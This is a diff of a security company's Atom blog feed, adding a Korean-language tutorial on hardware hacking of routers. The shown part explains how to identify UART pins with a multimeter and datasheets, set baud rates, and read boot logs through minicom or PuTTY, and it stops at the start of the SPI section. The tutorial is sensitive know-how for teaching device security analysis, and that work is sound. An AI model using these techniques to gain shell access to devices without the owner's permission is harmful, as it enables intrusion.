@@ -1,4 +1,719 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2023-11-15T12:46:48+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">Android Malware : 사마귀 해부학</title><link href="http://ufo.stealien.com/id/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko" rel="alternate" type="text/html" title="Android Malware : 사마귀 해부학" /><published>2023-11-15T10:00:00+09:00</published><updated>2023-11-15T10:00:00+09:00</updated><id>http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko</id><content type="html" xml:base="http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko">&lt;h1 id=&quot;android-malware--사마귀-해부학&quot;&gt;Android Malware : 사마귀 해부학&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2024-02-06T16:07:58+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">하드웨어 해킹: 뉴비 입문기</title><link href="http://ufo.stealien.com/id/2024-02-06/IoT-TechBlog-ko" rel="alternate" type="text/html" title="하드웨어 해킹: 뉴비 입문기" /><published>2024-02-06T10:00:00+09:00</published><updated>2024-02-06T10:00:00+09:00</updated><id>http://ufo.stealien.com/2024-02-06/IoT-TechBlog-ko</id><content type="html" xml:base="http://ufo.stealien.com/2024-02-06/IoT-TechBlog-ko">&lt;h1 id=&quot;하드웨어-해킹-뉴비-입문기&quot;&gt;하드웨어 해킹: 뉴비 입문기&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;이 포스트는 스틸리언 선제대응팀의 ‘이주협’ 선임 연구원님과 ‘이주영’ 연구원님이 정성스럽게 작성 해 주셨습니다.&lt;/p&gt;
+
+  &lt;p&gt;선제대응팀(Team Defend Forward)은 IoT, 임베디드 디바이스, 네트워크 디바이스같은 장비의 취약점 분석은 물론이고,
+모바일 디바이스 어플리케이션, 웹 서비스/어플리케이션, 데스크탑/서버 어플리케이션/서비스 등 다양한 소프트웨어에 대한
+화이트박스/블랙박스 펜테스팅 서비스를 제공하고 있습니다.&lt;/p&gt;
+
+  &lt;p&gt;by 선제대응팀 팀장 김도현&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;목차&quot;&gt;목차&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;UART
+    &lt;ul&gt;
+      &lt;li&gt;필요한 장비 정리&lt;/li&gt;
+      &lt;li&gt;메인 칩셋 데이터 시트 참고하는 법&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Desoldering&lt;/li&gt;
+  &lt;li&gt;FlashROM을 통한 펌웨어 추출&lt;/li&gt;
+  &lt;li&gt;펌웨어 조작 - 쉘 떨구기&lt;/li&gt;
+  &lt;li&gt;Soldering&lt;/li&gt;
+  &lt;li&gt;Glitching
+    &lt;ul&gt;
+      &lt;li&gt;Serial Data Output Pin Glitching&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;1-인트로&quot;&gt;1. 인트로&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;본 블로그 포스트는 SPI를 사용하는 Router의 하드웨어 해킹을 기준 해 작성했습니다. 라우터의 구현에 따른 한가지 방법일 뿐, 일반적으로 통용되는 하드웨어 해킹 방법론이 아님을 명시합니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;2-uart&quot;&gt;2. UART&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/UART.drawio.png&quot; alt=&quot;UART drawio&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;UART(Universal Asynchronous Receiver/Transmitter)는 두 하드웨어 기기가 서로 Serial 통신할 때 사용하는 프로토콜입니다. 주로 하드웨어 개발자들이 디버깅 용도로 사용합니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;21-uart를-사용하는-이유&quot;&gt;2.1. UART를 사용하는 이유&lt;/h3&gt;
+
+&lt;p&gt;경우에 따라 다르지만 UART로 Login Prompt 또는 OS Shell을 제공하는 하드웨어 기기가 있습니다. 하드웨어 기기의 쉘에 접근하면 기기 내에 동작하는 프로세스를 확인하거나 gdb와 같은 디버거를 원격으로 업로드하여 프로세스를 직접 디버깅하는 등의 분석을 수행할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;UART로 쉘을 제공하지 않더라도 부팅 로그를 출력하는 경우도 있습니다. 이 경우, 부팅 로그에 펌웨어 복호화 키와 같은 민감한 정보가 포함되어 있을 수 있습니다. 따라서 하드웨어 기기의 UART를 확인해야 하는 근거는 충분합니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;22-uart-연결-준비&quot;&gt;2.2. UART 연결 준비&lt;/h3&gt;
+
+&lt;p&gt;UART 연결에 필요한 장비는 다음과 같습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;장비&lt;/th&gt;
+      &lt;th&gt;역할&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;USB to TTL&lt;/td&gt;
+      &lt;td&gt;기기의 UART와 PC 간 시리얼 통신을 위한 USB Converter&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;점퍼 케이블(optional)&lt;/td&gt;
+      &lt;td&gt;USB to TTL과 기기의 UART 핀을 연결하는 케이블&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MultiMeter&lt;/td&gt;
+      &lt;td&gt;전기 및 전자 장비의 전압, 전류, 저항 등을 측정하는 테스트기&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;221-uart의-종류&quot;&gt;2.2.1. UART의 종류&lt;/h3&gt;
+
+&lt;p&gt;UART에 연결하기 전 기기마다 가질 수 있는 UART 형태의 종류를 알아보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/ipTIME_N704VS_UART.jpg&quot; alt=&quot;ipTIME N704VS router UART PIN&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ipTIME N704VS router UART PIN&lt;/p&gt;
+
+&lt;p&gt;ipTIME N704VS 라우터의 경우, UART에 핀 헤더가 연결되어 있기 때문에 각 핀의 역할만 찾으면 바로 USB to TTL과 연결하여 Serial 통신이 가능합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/Netis_UART.jpg&quot; alt=&quot;Netis router UART PIN&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Netis router UART PIN&lt;/p&gt;
+
+&lt;p&gt;Netis 라우터의 UART 핀입니다. 대부분의 UART 핀은 위 사진과 같이 4개의 패드로 존재합니다. 이러한 경우 암-수 점퍼 케이블을 연결하거나, 홀에 헤더핀을 납땜하여 암-암 점퍼케이블로 USB to TTL과 연결할 수 있습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;222-점퍼-케이블-종류&quot;&gt;2.2.2. 점퍼 케이블 종류&lt;/h3&gt;
+
+&lt;p&gt;점퍼 케이블의 종류는 다음과 같습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;케이블 명&lt;/th&gt;
+      &lt;th&gt;설명&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;암-암 점퍼 케이블&lt;/td&gt;
+      &lt;td&gt;케이블 헤더에 핀이 존재하지 않아 UART 핀과 탈부착할 수 있는 케이블&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;암-수 점퍼 케이블&lt;/td&gt;
+      &lt;td&gt;케이블의 한쪽 헤더에만 핀이 고정 되어있는 케이블&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;수-수 점퍼 케이블&lt;/td&gt;
+      &lt;td&gt;케이블의 양쪽 헤더에 핀이 고정 되어있는 케이블&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;일반 USB to TTL은 별도의 암-수 점퍼 케이블이나 암-암 점퍼 케이블과 핀 헤더가 필요합니다.&lt;/p&gt;
+
+&lt;p&gt;케이블 일체형 USB to TTL은 암-암 점퍼 케이블이 내장되어 있어 별도의 암-암 점퍼 케이블 없이도 UART 핀에 연결할 수 있습니다. 각 UART 핀의 역할을 점퍼 케이블의 색깔로 구분하여 연결합니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;223-uart-pin의-종류&quot;&gt;2.2.3. UART Pin의 종류&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/UART_Pin.drawio.png&quot; alt=&quot;UART Pin drawio&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;UART 핀의 각 역할은 다음과 같습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;UART 핀&lt;/th&gt;
+      &lt;th&gt;역할&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;메인 보드의 기준 전압을 맞춰주는 핀&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;TX&lt;/td&gt;
+      &lt;td&gt;시리얼 데이터를 송신하는 핀&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RX&lt;/td&gt;
+      &lt;td&gt;시리얼 데이터를 수신하는 핀&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+      &lt;td&gt;전원을 공급하는 핀&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;하드웨어 기기에 전원 케이블을 통해서 전원 공급이 가능하다면 VCC 핀은 연결하지 않습니다.&lt;/p&gt;
+
+&lt;p&gt;UART 핀의 역할을 알아보았으니 각 UART 핀을 식별해 봅시다.&lt;/p&gt;
+
+&lt;h2 id=&quot;23-uart-pin-식별&quot;&gt;2.3. UART PIN 식별&lt;/h2&gt;
+
+&lt;h3 id=&quot;231-uart-gnd-pin-식별&quot;&gt;2.3.1. UART GND PIN 식별&lt;/h3&gt;
+
+&lt;p&gt;UART의 GND 핀은 멀티미터를 통해 찾을 수 있습니다. 멀티미터의 Conductivity 모드는 전기회로가 서로 연결 되어있을 때 부저음을 출력합니다. PCB&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;에서 SPI Flash 칩의 GND 핀과 UART의 GND 핀은 연결되어 있습니다.&lt;/p&gt;
+
+&lt;p&gt;따라서 SPI Flash 칩의 GND 핀 위치를 찾고 각 UART 핀과 한번씩 연결해보는 방식으로 부저음을 통해서 UART의 GND 핀을 찾을 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(1) SPI Flash Chip GND PIN → UART GND PIN&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;SPI Flash 칩에서 GND 핀 위치는 데이터 시트를 통해 찾을 수 있습니다. SPI Flash 칩의 모델명을 확인하여 데이터 시트를 검색합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/flashchip.jpg&quot; alt=&quot;SPI Flash chip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/flashchip_datasheet.png&quot; alt=&quot;SPI Flash chip datasheet&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/flashchip_datasheet_table.png&quot; alt=&quot;SPI Flash chip datasheet table&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;데이터 시트를 통해 SPI Flash 칩의 GND 핀은 점을 기준으로 4번째 핀인 VSS 핀임을 알 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;이제 UART의 GND 핀을 식별해봅시다. 기기에 전원을 공급하지 않은 상태에서, 멀티미터를 Conductivity 모드로 설정합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/conductivity_mode.jpg&quot; alt=&quot;conductivity mode&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;멀티미터의 검은 리드선&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;을 SPI Flash 칩의 GND 핀에 고정한 상태에서 빨간 리드선을 각 UART 핀에 한번씩 연결합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(2) Other Method&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;데이터시트를 찾지 못한 이유로 SPI Flash 칩의 GND 핀 위치를 찾지 못할 수 있습니다. 해당 경우에는 멀티미터의 검은 리드선을 PCB의 구리 홀에 연결하고, 빨간 리드선을 각 UART 핀에 한번씩 연결하여 UART의 GND 핀을 찾을 수 있습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;232-tx--rx-식별&quot;&gt;2.3.2. TX &amp;amp; RX 식별&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;(1) MCU와 UART의 단락 상태 검사&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;UART의 TX, RX핀은 MCU의 TX와 RX 핀과 연결되어 있습니다. 이를 이용해서 MCU의 TX와 RX 핀을 찾고 멀티미터 Conductivity 모드로 UART의 TX와 RX 핀을 찾을 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/mcu.jpg&quot; alt=&quot;mcu&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;경우에 따라 MCU 위에 방열판이 덮고 있을 수 있습니다. MCU를 덮고 있는 방열판을 제거하고 MCU 칩 정보를 확인하여 데이터 시트를 검색합니다:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/mcu_datasheet.png&quot; alt=&quot;mcu datasheet&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/mcu_datasheet_table.png&quot; alt=&quot;mcu datasheet table&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;UART 핀은 125번 핀과 126번 핀입니다. MCU의 기준점(사진의 빨간 동그라미)을 바탕으로 125번, 126번 핀의 실제 위치를 찾을 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/mcu_highlighted.jpg&quot; alt=&quot;mcu highlighted&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;이제 기기에 전원을 공급하지 않은 상태에서 멀티미터를 Conductivity 모드로 설정합니다. 검은색 리드선을 MCU의 RX에 고정하고 빨간색 리드선을 각 UART 핀에 연결했을 때, 부저음을 출력하는 핀이 UART의 RX 핀입니다. TX도 같은 방식으로 식별해봅시다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(2) 핀의 전압, 전류 측정&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;이번에는 MCU의 데이터시트가 없어 RX와 TX를 찾지 못한 경우에 UART의 RX와 TX 핀을 식별할 수 있는 방법을 사용해봅시다.&lt;/p&gt;
+
+&lt;p&gt;멀티미터를 DCV(직류전압) 모드로 설정한 후 검은색 프로브를 COM 단자, 빨간색 프로브를 V-Ω 단자에 연결합니다. 기기에 전원을 공급한 후, 검은색 리드선을 기기의 GND와 접촉하고, 빨간색 리드선은 식별하고자 하는 UART핀과 접촉하여 전압을 측정합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/dcv.jpg&quot; alt=&quot;dcv&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;일반적으로 전압이 2.4V ~ 3.3V 사이를 지속적으로 변한다면 TX 핀, 전압이 0.0V이면 RX 핀입니다. TX 핀은 다양한 데이터를 송신하기 때문에 2.4V ~ 3.3V 사이에서 전압이 지속적으로 변합니다. RX 핀은 송신 행위 없이 데이터를 수신하는 역할만 수행하기 때문에 0.0V의 전압을 띄고 있습니다. 하지만 전원이 들어온 상태에서 TX와 RX의 전압을 측정할 때 노이즈가 발생하므로 경우에 따라 UART의 TX와 RX 전압이 거의 동일하게 측정됩니다.&lt;/p&gt;
+
+&lt;p&gt;전압으로 TX와 RX를 구분할 수 없는 경우라면 전류를 측정하여 구분해봅니다. 멀티미터를 DCA(직류 전압) 모드로 설정한 후 검은색 프로브는 COM 단자에, 빨간색 프로브는 전류측정단자(~mA)에 연결합니다. 검은색 리드선은 기기의 GND와 접촉하고 빨간색 리드선은 식별대상 UART 핀에 접촉합니다. 기기에 전원을 공급한 후 측정되는 전류를 관찰합니다. 일반적으로 VCC, GND, RX는 전류가 흐르지 않고(0mA) TX의 경우에만 23mA~44mA 사이의 전류가 흐르고 있습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;mode&lt;/th&gt;
+      &lt;th&gt;PIN1&lt;/th&gt;
+      &lt;th&gt;PIN2&lt;/th&gt;
+      &lt;th&gt;PIN3&lt;/th&gt;
+      &lt;th&gt;PIN4&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DCV&lt;/td&gt;
+      &lt;td&gt;0 V&lt;/td&gt;
+      &lt;td&gt;0 V&lt;/td&gt;
+      &lt;td&gt;3.25 V&lt;/td&gt;
+      &lt;td&gt;3.25 V&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DCA&lt;/td&gt;
+      &lt;td&gt;0 mA&lt;/td&gt;
+      &lt;td&gt;0 mA&lt;/td&gt;
+      &lt;td&gt;23.4 mA&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;RX&lt;/td&gt;
+      &lt;td&gt;TX&lt;/td&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TIP: 멀티미터를 통한 RX, TX 구분이 어렵다면 :
+    &lt;ul&gt;
+      &lt;li&gt;MCU의 데이터시트를 참고하여 정확하게 식별합니다.&lt;/li&gt;
+      &lt;li&gt;일단 RX, TX를 임의로 가정한 후 뒤의 과정대로 연결 수행 → 시리얼 통신 시 아무 반응이 없다면 바꿔서 연결합니다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;24-baud-rate란&quot;&gt;2.4. Baud Rate란&lt;/h2&gt;
+
+&lt;p&gt;GND, TX, RX 핀을 모두 식별하였으니 UART 통신에 필요한 Baud Rate 개념을 알아야 합니다.&lt;/p&gt;
+
+&lt;p&gt;Baud Rate는 1초에 전송할 수 있는 symbol&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;의 수입니다. 따라서 IoT 기기와 UART Serial 통신을 하기 위해서는 각 기기마다 사용하는 Baud Rate에 맞춰 통신 속도를 설정해야 합니다.&lt;/p&gt;
+
+&lt;p&gt;아래는 UART에서 흔히 사용하는 Baud Rate 리스트입니다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;115200&lt;/code&gt; 이하 값을 주로 사용합니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Baud Rate&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4147200&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;921600&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;576000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;460800&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;115200&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;57600&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;38400&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;28800&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19200&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9600&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4800&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2400&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1200&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Baud Rate 개념까지 알았으니 다음으로는 USB to TTL을 통해 UART Serial 통신을 해봅시다.&lt;/p&gt;
+
+&lt;p&gt;위의 값들이 아닌 다른 Baud Rate 값을 사용한다면, Logical Analyzer를 사용하거나 기기 이름의 buad rate에 대해 검색하는 등의 방법을 사용할 수 있습니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;25-uart-연결&quot;&gt;2.5. UART 연결&lt;/h2&gt;
+
+&lt;h3 id=&quot;251-mac-환경&quot;&gt;2.5.1. Mac 환경&lt;/h3&gt;
+
+&lt;p&gt;본 항목에서는 Mac 환경에서의 UART 연결 방법에 대해서 다루겠습니다. Serial 통신 콘솔을 위해 minicom 프로그램을 사용합니다.&lt;/p&gt;
+
+&lt;p&gt;점퍼 케이블을 사용해 USB to TTL의 케이블을 UART핀에 연결 합니다. 각 케이블의 역할은 아래와 같습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;케이블 색&lt;/th&gt;
+      &lt;th&gt;USB to TTL 핀&lt;/th&gt;
+      &lt;th&gt;UART 핀&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;검은색&lt;/td&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;흰색&lt;/td&gt;
+      &lt;td&gt;RX&lt;/td&gt;
+      &lt;td&gt;TX&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;청록색&lt;/td&gt;
+      &lt;td&gt;TX&lt;/td&gt;
+      &lt;td&gt;RX&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;연결 시 UART의 TX 핀에는 USB to TTL의 RX 케이블을, UART RX 핀에는 USB to TTL의 TX 케이블을 연결하도록 주의해야 합니다. IoT 기기에서 송신한 데이터를 USB to TTL이 수신하고, USB to TTL이 송신한 데이터를 IoT 기기가 수신하기 때문입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/lsusb.png&quot; alt=&quot;lsusb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;USB to TTL의 USB 포트는 PC에 연결합니다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsusb&lt;/code&gt; 명령어를 사용해서 USB to TTL이 PC에 제대로 연결되었는지 확인할 수 있습니다. minicom의 Serial 장치를 설정하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls /dev | grep usb&lt;/code&gt; 명령어로 연결된 USB to TTL의 장치 이름을 확인합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/ls_dev.png&quot; alt=&quot;list dev directory&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/minicom_s.png&quot; alt=&quot;minicom setting&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;USB to TTL의 장치 이름을 알았으니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;minicom -s&lt;/code&gt; 명령어로 UART 통신을 설정합니다. Serial 장치를 설정하고 Baud Rate를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;38400&lt;/code&gt;으로 설정하여 UART 통신 시 출력이 제대로 되는지 확인합니다. 만약 출력 결과를 읽을 수 없다면 Baud Rate를 바꿔가면서 정확한 값을 구할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;Baud Rate을 바꿔줄 때마다 장치 재부팅이 필요합니다. 부트 로그가 UART로 모두 출력되었다면 더 이상 출력할 데이터가 없습니다. 이 때문에 재부팅 없이 Baud Rate 값만 바꿔주면 값이 올바른지 여부가 의심스럽습니다. 따라서 Baud Rate 테스트를 진행할 때 기기를 재부팅해야 모든 부트 로그를 확인할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/uart.png&quot; alt=&quot;uart&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;확인 결과 부트로그가 제대로 출력 되었습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;252-windows-환경&quot;&gt;2.5.2. Windows 환경&lt;/h3&gt;
+
+&lt;p&gt;본 항목에서는 Windows 환경에서 UART를 연결해보겠습니다. Serial 통신을 위해서 PuTTY 프로그램을 사용한다는 점이 Mac 환경과 다릅니다.&lt;/p&gt;
+
+&lt;p&gt;USB to TTL의 점퍼 케이블을 IoT 기기의 UART에 연결한 후 PC에 USB를 연결합니다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;내 컴퓨터 &amp;gt; 장치관리자&lt;/code&gt; 의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;포트&lt;/code&gt; 탭에서 USB to TTL이 PC에 올바르게 인식되는지 확인할 수 있습니다. PuTTY의 Serial line을 설정하기 위해 인식된 USB to TTL 장치의 이름을 확인합니다. (만약 포트 탭에 장치가 인식되지 않는다면, 기타 장치 탭을 확인해봅시다. 기타 장치로 인식되었다면 드라이버를 설치해야 합니다.)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/windows_device_manager.png&quot; alt=&quot;windows device manager&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Serial 장치를 설정한 후 정확한 Baud Rate 값을 구합니다. UART 통신을 모두 설정하였다면 IoT 기기의 전원을 공급하여 부팅 시 로그가 출력 되는지 확인합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/putty_s.png&quot; alt=&quot;putty setting&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/putty.png&quot; alt=&quot;putty&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;3-spi-통신으로-펌웨어-추출하기&quot;&gt;3. SPI 통신으로 펌웨어 추출하기&lt;/h2&gt;
+
+&lt;h3 id=&quot;31-spi란&quot;&gt;3.1. SPI란&lt;/h3&gt;
+
